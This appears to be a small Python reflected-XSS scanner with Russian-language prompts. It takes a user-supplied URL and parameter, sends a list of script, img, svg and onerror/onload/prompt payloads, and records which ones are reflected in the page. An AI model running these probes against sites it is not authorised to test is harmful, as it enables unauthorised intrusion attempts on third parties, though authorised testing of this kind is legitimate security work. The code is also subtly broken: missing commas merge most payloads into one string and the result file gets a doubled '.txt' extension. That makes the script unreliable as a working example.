import requests
import datetime
import urllib.parse

result = f"xss_result_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.txt"

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<image/src/onerror=prompt(8)>"
    "<img/src/onerror=prompt(8)>"
    "<image src/onerror=prompt(8)>"
    "<img src/onerror=prompt(8)>"
    "<image src =q onerror=prompt(8)>"
    "<img src =q onerror=prompt(8)>"
    "</scrip</script>t><img src =q onerror=prompt(8)>"
]

headers = {
    "User-Agent": "Mozilla/5.0 (VenturaCounty; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89"
}

url = input("Введите url (например, https://example.com): ").strip()
param = input("Выбери имя параметра(например, q): ").strip()

print("\nПроверка на xss")

for payload in payloads:
    encoded_payload = urllib.parse.quote(payload)
    test_url = f"{url}?{param}={encoded_payload}"

    try:
        response = requests.get(test_url, headers=headers)
        if payload in response.text:
            print(f"Сработал {payload}")
            with open(f"{result}.txt", "a") as f:
                f.write(f"сработал {payload}\n")
        else:
            print(f"не сработал {payload}")
            with open(f"{result}.txt", "a") as f:
                f.write(f"не сработал {payload}\n")
    except Exception as e:
        print(f"ошибка {e}")
